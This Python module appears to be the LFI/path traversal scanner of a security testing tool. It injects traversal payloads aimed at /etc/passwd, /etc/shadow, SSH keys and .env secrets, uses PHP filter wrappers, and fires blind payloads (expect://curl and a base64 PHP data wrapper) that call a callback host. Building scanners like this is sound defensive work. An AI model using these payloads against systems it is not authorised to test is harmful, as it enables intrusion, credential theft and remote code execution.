"""
Local File Inclusion (LFI) / Path Traversal Scanner — baseline-aware.

Improvements:
  - Replaces 20-byte size gate with statistical baseline (3σ)
  - File signatures checked against baseline content to prevent FPs
    (e.g., "docker" in docs, "PATH=" in environment references)
  - Uses ErrorPatternMatcher.match_file_disclosure() for definitive patterns
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

from secprobe.config import Severity
from secprobe.core.detection import Confidence, ErrorPatternMatcher, ResponseAnalyzer
from secprobe.core.exceptions import TargetUnreachableError
from secprobe.scanners.smart_scanner import SmartScanner
from secprobe.utils import normalize_url, print_status, print_finding


# Signatures that confirm successful file read
FILE_SIGNATURES = {
    "unix_passwd": [
        re.compile(r"root:[x*]:0:0:"),
        re.compile(r"daemon:[x*]:\d+:\d+:"),
        re.compile(r"nobody:[x*]:\d+:\d+:"),
    ],
    "unix_shadow": [
        re.compile(r"root:\$[0-9a-z]+\$"),
    ],
    "unix_hosts": [
        re.compile(r"127\.0\.0\.1\s+localhost"),
    ],
    "win_ini": [
        re.compile(r"\[fonts\]", re.IGNORECASE),
        re.compile(r"\[extensions\]", re.IGNORECASE),
        re.compile(r"for 16-bit app support", re.IGNORECASE),
    ],
    "win_boot": [
        re.compile(r"\[boot loader\]", re.IGNORECASE),
    ],
    "proc_environ": [
        re.compile(r"DOCUMENT_ROOT="),
        re.compile(r"HOSTNAME="),
    ],
    "php_source": [
        re.compile(r"<\?php"),
        re.compile(r"PD9waH"),  # base64 of <?ph
    ],
    "ssh_key": [
        re.compile(r"-----BEGIN [A-Z ]+ PRIVATE KEY-----"),
    ],
    "env_file": [
        re.compile(r"DB_PASSWORD\s*="),
        re.compile(r"APP_KEY\s*="),
        re.compile(r"SECRET_KEY\s*="),
        re.compile(r"AWS_SECRET_ACCESS_KEY\s*="),
    ],
}

SECTION_TO_SIGS = {
    "Basic Path Traversal (Unix)": ["unix_passwd", "unix_shadow", "unix_hosts", "proc_environ", "ssh_key"],
    "Basic Path Traversal (Windows)": ["win_ini", "win_boot"],
    "Forward Slash Variants (Windows)": ["win_ini", "win_boot"],
    "Null Byte Injection": ["unix_passwd", "win_ini"],
    "URL Encoding": ["unix_passwd", "win_ini"],
    "Double URL Encoding": ["unix_passwd"],
    "UTF-8 / Unicode Encoding": ["unix_passwd"],
    "Filter Bypass / WAF Evasion": ["unix_passwd", "win_ini", "proc_environ"],
    "PHP Wrappers & Filters": ["php_source"],
    "Application-Specific Files": ["unix_passwd", "env_file", "php_source"],
    "Log Files": ["unix_passwd"],
    "Docker & Container": [],
    "Cloud Metadata": [],
}


class LFIScanner(SmartScanner):
    name = "LFI Scanner"
    description = "Test for Local File Inclusion / Path Traversal vulnerabilities"

    def scan(self):
        url = normalize_url(self.config.target)
        print_status(f"Testing LFI/Path Traversal on {url}", "progress")

        # ── Initialize detection engine ──────────────────────────────
        engine = self._init_detection_engine()

        try:
            baseline = self.http_client.get(url)
        except TargetUnreachableError as e:
            print_status(f"Cannot reach target: {e}", "error")
            self.result.error = str(e)
            return

        baseline_text = baseline.text

        # ── Detect target technology ─────────────────────────────────
        baseline_tech = self.detect_technology(baseline_text)
        if baseline_tech:
            print_status(f"Technology detected: {', '.join(baseline_tech)}", "info")

        # Profile endpoint for statistical baseline
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        baseline_profile = engine.profile(url, params=params or None)

        # Load payloads
        try:
            from secprobe.payloads import load_payloads_by_section
            payload_sections = load_payloads_by_section("lfi")
        except Exception:
            payload_sections = {
                "Basic Path Traversal (Unix)": [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "../../../etc/shadow",
                ],
                "Basic Path Traversal (Windows)": [
                    "..\\..\\..\\windows\\win.ini",
                ],
            }

        total_payloads = sum(len(v) for v in payload_sections.values())
        print_status(f"Loaded {total_payloads} LFI payloads in {len(payload_sections)} categories", "info")

        # Gather injection points
        test_urls = self._build_test_urls(url)
        if self.context:
            for u in self.context.get_injection_urls():
                if u not in test_urls:
                    test_urls.append(u)

        if not test_urls:
            common_params = [
                "file", "path", "page", "include", "document", "folder",
                "root", "dir", "pg", "style", "template", "php_path",
                "doc", "img", "filename", "url", "lang",
            ]
            for param in common_params:
                test_urls.append(f"{url}?{param}=FUZZ")

        vulns_found = 0
        tested = set()

        for test_url in test_urls:
            for section_name, payloads in payload_sections.items():
                sig_keys = SECTION_TO_SIGS.get(section_name, ["unix_passwd", "win_ini"])

                for payload in payloads:
                    if self.config.rate_limit:
                        time.sleep(self.config.rate_limit)

                    payload_variants = self._evade_payload(payload, vuln_type="lfi")
                    for p in payload_variants:
                        injected = self._inject(test_url, p)

                        if injected in tested:
                            continue
                        tested.add(injected)

                        try:
                            resp = self.http_client.get(injected, allow_redirects=False)
                        except Exception:
                            continue

                        # STATISTICAL size gate (replaces naive 20-byte threshold)
                        if baseline_profile and baseline_profile.sample_count >= 2:
                            if not baseline_profile.is_size_anomalous(len(resp.text)):
                                continue
                        elif abs(len(resp.text) - len(baseline_text)) < 50:
                            continue

                        # PRIMARY: Use ErrorPatternMatcher with baseline subtraction
                        file_matches = ErrorPatternMatcher.match_file_disclosure(
                            resp.text, baseline_text)

                        if file_matches:
                            best = max(file_matches, key=lambda m: m.confidence)
                            if best.confidence >= Confidence.FIRM:
                                severity = self._determine_severity(p, best.technology)
                                # ── SmartScanner verification ────────
                                verification = self.verify_finding(
                                    url=injected,
                                    param=next(iter(parse_qs(urlparse(injected).query, keep_blank_values=True)), "file"),
                                    payload=p, vuln_type="lfi",
                                )
                                vulns_found += 1
                                if verification.confirmed:
                                    self.add_verified_finding(
                                        title=f"Verified LFI - {best.technology} ({section_name})",
                                        severity=severity,
                                        description=(
                                            f"Path traversal VERIFIED (confidence: {verification.confidence.name}).\n"
                                            f"Payload: {p}\n"
                                            f"File content: {best.description}"
                                        ),
                                        confidence=verification.confidence,
                                        verification_evidence=verification.evidence,
                                        recommendation="Validate file path input. Use allow-lists.",
                                        category="Path Traversal",
                                        url=injected,
                                        cwe="CWE-22",
                                    )
                                    print_finding(severity, f"Verified LFI: {best.technology}")
                                else:
                                    self.add_finding(
                                        title=f"LFI - {best.technology} ({section_name})",
                                        severity=severity,
                                        description=(
                                            f"Path traversal successful (confidence: {best.confidence.name}).\n"
                                            f"Payload: {p}\n"
                                            f"File content: {best.description}"
                                        ),
                                        recommendation="Validate file path input. Use allow-lists.",
                                        evidence=(
                                            f"URL: {injected}\n"
                                            f"Matched: {best.matched_text[:200]}\n"
                                            f"Response length: {len(resp.text)}"
                                        ),
                                        category="Path Traversal",
                                        url=injected,
                                        cwe="CWE-22",
                                    )
                                    print_finding(severity, f"LFI: {best.technology} ({best.confidence.name})")
                                break

                        # FALLBACK: local signature check with baseline subtraction
                        match_result = self._check_signatures(resp.text, sig_keys, baseline_text)
                        if match_result:
                            sig_type, matched_pattern = match_result
                            severity = self._determine_severity(p, sig_type)
                            vulns_found += 1
                            self.add_finding(
                                title=f"LFI - {sig_type} ({section_name})",
                                severity=severity,
                                description=f"Path traversal: {sig_type} content detected (baseline-verified).",
                                recommendation="Validate and sanitize file path input.",
                                evidence=f"URL: {injected}\nPayload: {p}\nMatched: {matched_pattern}",
                                category="Path Traversal",
                                url=injected,
                                cwe="CWE-22",
                            )
                            print_finding(severity, f"LFI: {sig_type} via {section_name}")
                            break
                    else:
                        continue
                    break

        # Test POST forms
        forms = self.context.get_injectable_forms() if self.context else []
        for form in forms:
            action = form.get("action", url)
            fields = form.get("fields", {})
            for field_name in fields:
                post_payloads = [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "php://filter/convert.base64-encode/resource=../config.php",
                ]
                for payload in post_payloads:
                    post_data = dict(fields)
                    post_data[field_name] = payload
                    try:
                        resp = self.http_client.post(action, data=post_data)
                    except Exception:
                        continue

                    file_matches = ErrorPatternMatcher.match_file_disclosure(
                        resp.text, baseline_text)
                    if file_matches:
                        best = max(file_matches, key=lambda m: m.confidence)
                        if best.confidence >= Confidence.FIRM:
                            vulns_found += 1
                            self.add_finding(
                                title=f"LFI (POST) - {best.technology} via '{field_name}'",
                                severity=Severity.HIGH,
                                description=f"POST-based LFI at {action}",
                                recommendation="Sanitize file path input.",
                                evidence=f"Field: {field_name}\nPayload: {payload}\nMatch: {best.matched_text[:100]}",
                                category="Path Traversal",
                                url=action,
                                cwe="CWE-22",
                            )
                            break

        # ── OOB blind LFI (PHP wrappers → RCE) ──────────────────────
        if self.oob_available:
            print_status("OOB blind LFI testing", "progress")
            oob_count = 0
            for test_url in test_urls[:5]:
                param_name = next(iter(parse_qs(urlparse(test_url).query)), "file")
                # PHP expect wrapper → RCE with callback
                token = self.oob_generate_token(test_url, param_name, "lfi_blind", "php_expect")
                cb_url = self.oob_get_url(token)
                p = f"expect://curl {cb_url}"
                injected = self._inject(test_url, p)
                try:
                    self.http_client.get(injected, allow_redirects=False)
                    oob_count += 1
                except Exception:
                    pass
                # PHP data wrapper
                token = self.oob_generate_token(test_url, param_name, "lfi_blind", "php_data")
                cb_url = self.oob_get_url(token)
                import base64
                cmd = base64.b64encode(f'<?php file_get_contents("{cb_url}");?>'.encode()).decode()
                p = f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{cmd}"
                injected = self._inject(test_url, p)
                try:
                    self.http_client.get(injected, allow_redirects=False)
                    oob_count += 1
                except Exception:
                    pass
            if oob_count:
                print_status(f"Sent {oob_count} OOB LFI payloads, waiting...", "progress")
                self.oob_collect_findings(wait_seconds=10)

    def _build_test_urls(self, url):
        parsed = urlparse(url)
        if parsed.query:
            return [url]
        return []

    def _inject(self, url, payload):
        if "FUZZ" in url:
            return url.replace("FUZZ", quote(payload, safe="/:?&=%"))
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        injected = {}
        for key in params:
            injected[key] = payload
        return urlunparse(parsed._replace(query=urlencode(injected, safe="/:?&=%")))

    def _check_signatures(self, text, sig_keys, baseline_text):
        """Check signatures with baseline subtraction."""
        for sig_key in sig_keys:
            patterns = FILE_SIGNATURES.get(sig_key, [])
            for pattern in patterns:
                match = pattern.search(text)
                if match:
                    # BASELINE SUBTRACTION: skip if this pattern also matches baseline
                    if pattern.search(baseline_text):
                        continue
                    return (sig_key, pattern.pattern)
        return None

    def _determine_severity(self, payload, sig_type):
        if sig_type in ("unix_shadow", "ssh_key", "env_file", "Private key"):
            return Severity.CRITICAL
        if sig_type in ("unix_passwd", "proc_environ", "/etc/passwd"):
            return Severity.HIGH
        if "php://filter" in payload or "expect://" in payload:
            return Severity.CRITICAL
        return Severity.HIGH
